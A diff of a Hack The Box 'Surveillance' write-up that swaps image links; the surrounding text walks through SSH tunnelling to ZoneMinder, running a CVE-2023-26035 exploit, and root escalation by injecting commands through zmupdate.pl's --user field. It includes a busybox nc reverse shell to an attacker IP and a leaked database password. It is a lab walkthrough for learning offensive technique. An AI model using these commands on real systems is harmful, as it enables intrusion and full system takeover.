@@ -160,7 +160,7 @@ Lets further escalate our privileges
 
 Running the command `netstat -tulnp` you'll find out that there's a port `8080` running internally 
 
-![[Pasted image 20240220022103.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3cbce606-e70f-475d-872e-c278133132f1)
 
 Lets portforward using ssh tunelling
 
@@ -168,23 +168,23 @@ command:`ssh -L 1234:127.0.0.1:8080 matthew@surveillance.htb -fN`
 
 `-fN`: These options tell SSH to go into the background (`-f`) and not execute any remote commands (`-N`). This is useful when you only want to establish the SSH tunnel without opening a shell session on the remote server.
 
-![[Pasted image 20240220192404.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3d3c8256-5b69-4b39-8fc7-546af782506a)
 
 Now that we've done that lets navigate to the url `http://127.0.0.1:1234`
 
-![[Pasted image 20240220192639.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/935f576c-e9a2-409c-8453-2663bf6140eb)
 
 We get this `ZoneMinder` login page
 
 What's ZoneMinder??
 
-![[Pasted image 20240220192823.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58376b83-d1d6-4939-b858-a4f2fccab0fd)
 
 So it is a free open-source software used for monitoring
 
 Default creds `admin/admin` didn't work hehe. Lets look for public exploits
 
-![[Pasted image 20240220193401.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/066069e7-fadd-4206-9919-3572959a7b39)
 
 You can download the exploit we'll be using from [here](https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py)
 
@@ -192,8 +192,7 @@ To run the exploit
 
 command:`python bankai.py -t http://127.0.0.1:1234/ -ip 10.10.14.165 -p 1337`
 
-
-![[Pasted image 20240220193308.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f3483df7-74e8-4397-a7f4-cb80dfcc3159)
 
 Cool. we spawned a reverse shell hehe
 
@@ -206,25 +205,25 @@ stty raw -echo && fg
 export TERM=xterm
 ```
 
-![[Pasted image 20240220193716.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cc303cc2-2e0f-46b8-9cd8-190d8c2753ef)
 
 Now we can try to get root from here
 
 Running  the command `sudo -l`
 
-![[Pasted image 20240220193848.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ca0094bd-345a-474c-8735-097a6a26dcae)
 
 Now, all scripts related to application software can be run as sudo. So we need to find the particular script we can use
 
 command:`find . -type f -name 'zm[a-zA-Z]*.pl'`
 
-![[Pasted image 20240220195515.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a4554e86-1448-4123-8d37-4ab5161d97a1)
 
 After a little research I found out that `zmupdate.pl` has a vulnerability
 
 Lets use the help menu
 
-![[Pasted image 20240220200057.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6bba096f-2c9f-4d92-b332-dcc970e78264)
 
 So you'll need to specify a version. username and then a password. If you recall from our linpeas output we found the password of a `zm` database to be `ZoneMinderPassword2023`
 
@@ -236,7 +235,7 @@ So we can execute a command like this
 sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
 ```
 
-![[Pasted image 20240220200441.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bedfb145-366e-434e-ab03-b4323ac0b7bb)
 
 As you can see we got a root shell but it is not responsive hehe.
 
@@ -247,10 +246,9 @@ Well, lets create a reverse shell using a busybox payload and send it over to th
 busybox nc 10.10.14.165 4444 -e /bin/sh
 ```
 
->Ensure you edit the LHOST and the LPORT to that which applies to your attacking machine
+Ensure you edit the LHOST and the LPORT to that which applies to your attacking machine
 
-
-![[Pasted image 20240220200810.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eb0cfa85-40da-4384-b63a-2f09bb618047)
 
 Nice now lets run the `zmupdate.pl` script again
 
@@ -258,10 +256,11 @@ Nice now lets run the `zmupdate.pl` script again
 sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploit.sh)' --pass=ZoneMinderPassword2023
 ```
 
-![[Pasted image 20240220201110.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e910bfa-05f6-4a14-a134-a6e2ac65b2bf)
 
 We spawned a root shell hehe
 
-![[Pasted image 20240220201221.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2dfb56b1-e3bd-46ab-841c-1aef00f0f722)
 
-Box pwned successfully
+Box pwned successfully😎
+
